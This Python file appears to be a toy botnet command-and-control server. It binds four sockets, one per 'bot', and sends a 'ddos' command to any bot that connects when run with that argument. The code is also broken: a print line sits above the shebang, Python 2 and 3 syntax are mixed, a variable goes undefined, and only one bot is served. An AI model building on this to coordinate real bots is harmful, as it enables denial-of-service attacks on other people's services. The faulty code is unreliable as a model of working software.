print("server started")
#!/usr/bin/python           		# This is server.py file

import socket               		# Import socket module
import sys

conn_bot_1 = conn_bot_2 = conn_bot_3 = conn_bot_4 = 0

class Bot(object):
    """\
    Simple class to track available workers
    """
    def __init__(self, id, name):
        self.id = id
        self.name = name
s_1 = socket.socket()        	 	# Create a socket object for bot 1
s_2 = socket.socket()         		# Create a socket object for bot 2
s_3 = socket.socket()         		# Create a socket object for bot 3
s_4 = socket.socket()         		# Create a socket object for bot 4

host = socket.gethostname() 		# Get local machine name

port_1 = 11111		        		# Reserve a port for bot 1
port_2 = 22222		        		# Reserve a port for bot 2
port_3 = 33333		        		# Reserve a port for bot 3
port_4 = 44444		        		# Reserve a port for bot 4

s_1.bind((host, port_1))        	# Bind to the port for each bot
s_2.bind((host, port_2))        	# Bind to the port for each bot
s_3.bind((host, port_3))        	# Bind to the port for each bot
s_4.bind((host, port_4))        	# Bind to the port for each bot
commands = ['ddos']

s_1.listen(5)                 		# Now wait for client connection on bot 1.
s_2.listen(5)                 		# Now wait for client connection on bot 2.
s_3.listen(5)                 		# Now wait for client connection on bot 3.
s_4.listen(5)                 		# Now wait for client connection on bot 4.
if(len(sys.argv)>1):
	if( sys.argv[1] == commands[0]):
		cmd=1

while True:
	try:
		if not conn_bot_1:
#			print("w")
			s_1.settimeout(1)
			c, addr = s_1.accept()    	# Establish connection with client.
			print 'Got connection from bot 1', addr
			if(cmd==1):
				print "Send ddos command to all active bots"
				c.send('ddos')
			conn_bot_1 = 1
			c.close()                	# Close the connection
	except:
		pass
